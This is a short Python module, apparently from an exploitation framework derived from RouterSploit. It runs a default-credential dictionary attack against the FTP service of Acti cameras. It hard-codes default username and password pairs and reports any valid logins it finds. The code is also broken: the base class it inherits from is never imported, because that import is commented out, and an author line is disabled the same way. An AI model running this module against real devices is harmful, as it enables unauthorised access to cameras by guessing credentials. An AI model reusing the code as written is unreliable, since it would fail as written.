# Absorbed from RouterSploit — rewritten for EmbedXPL v5.0.0
# Original authors preserved in __info__["authors"]
# EmbedXPL adaptation: André Henrique (@mrhenrike) | União Geek

from embedxpl.core.exploit import *
# SKIPPED: # FIXED: from routersploit.modules.creds.generic.ftp_default import Exploit as FTPDefault


class Exploit(FTPDefault):
    __info__ = {
        "name": "Acti Camera Default FTP Creds",
        "description": "Module performs dictionary attack with default credentials against Acti Camera FTP service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "EmbedXPL absorption: André Henrique (@mrhenrike) | União Geek",
# SKIPPED:             "Marcin Bury <marcin[at]threat9.com",  # routersploit module
        ),
        "devices": (
            "Acti Camera",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(21, "Target FTP port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:12345,admin:123456,Admin:12345,Admin:123456", "User:Pass or file with default credentials (file://)")
